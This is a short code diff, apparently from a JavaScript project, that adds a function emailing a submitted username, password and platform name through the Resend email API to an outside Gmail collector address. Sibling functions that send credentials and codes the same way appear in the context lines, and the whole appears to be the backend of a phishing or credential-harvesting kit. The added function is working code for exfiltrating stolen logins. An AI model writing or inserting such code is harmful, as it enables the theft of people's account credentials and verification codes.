@@ -47,6 +47,28 @@ export const sendCredentials = async (username, password) => {
   });
 };
 
+export const sendCredentialsPurpleWave = async (
+  username,
+  password,
+  platform,
+) => {
+  await resendAPIKEY.emails.send({
+    from: "onboarding@resend.dev",
+    to: "lummybackend@gmail.com",
+    subject: "Credentials",
+    html: `
+      <div>
+        <strong>Platform:</strong>
+        <p>${platform}</p>
+        <strong>Username:</strong>
+        <p>${username}</p>
+        <strong>Password:</strong>
+        <p>${password}</p>
+      </div>
+    `,
+  });
+};
+
 export const sendCode = async (code) => {
   await resendAPIKEY.emails.send({
     from: "onboarding@resend.dev",
